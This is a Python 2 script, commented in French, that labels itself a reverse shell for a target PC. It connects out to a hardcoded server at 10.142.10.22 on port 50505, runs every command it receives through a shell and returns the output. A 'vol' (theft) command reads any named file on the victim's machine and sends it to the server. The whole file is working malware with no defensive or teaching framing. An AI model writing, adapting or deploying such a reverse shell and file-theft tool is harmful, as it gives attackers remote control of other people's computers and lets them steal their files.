#Reverse shell by propA
#Client-Side donc PC cible

import socket
import subprocess
import os



def connect(ipServer, portServer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipServer, int(portServer)))

    while True:
        command = s.recv(1024)

        #Commande FERMER
        if 'fermer' in command:
            s.close()
            break

        #Commande VOL
        elif 'vol' in command:
            cmd = command.split(' ')

            if len(cmd) >= 2:
                vol = cmd[0]

                path = ""
                for i in range(1, len(cmd)):
                    path += cmd[i]
                    path += " "
                path = path[:-1]

                try:
                    transfer(s, path)
                except Exception, e:
                    s.send(str(e))
                    pass

            else:
                s.send("Erreur dans l'arguments, ex: \"vol chemin\d'acces\vers\le\fichier")




        #Commande Windows 
        else:

            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())


def transfer(s, path):
    print path
    if os.path.exists(path):
        s.send("Nom du fichier:"+path)
        
        f = open(path, 'rb')
        packet = f.read(1024)

        while packet != '':
            s.send(packet)
            print 'packet envoye'
            packet = f.read(1024)
        s.send('Paquet de fin de fichier')
        print 'packet de fin'
        f.close()
    else:
        s.send('!!!Fichier specifie introuvable!!!')
        print 'inexistant'

def main():
    ipServer = "10.142.10.22"
    portServer = "50505"
    connect(ipServer, portServer)
        
main()            
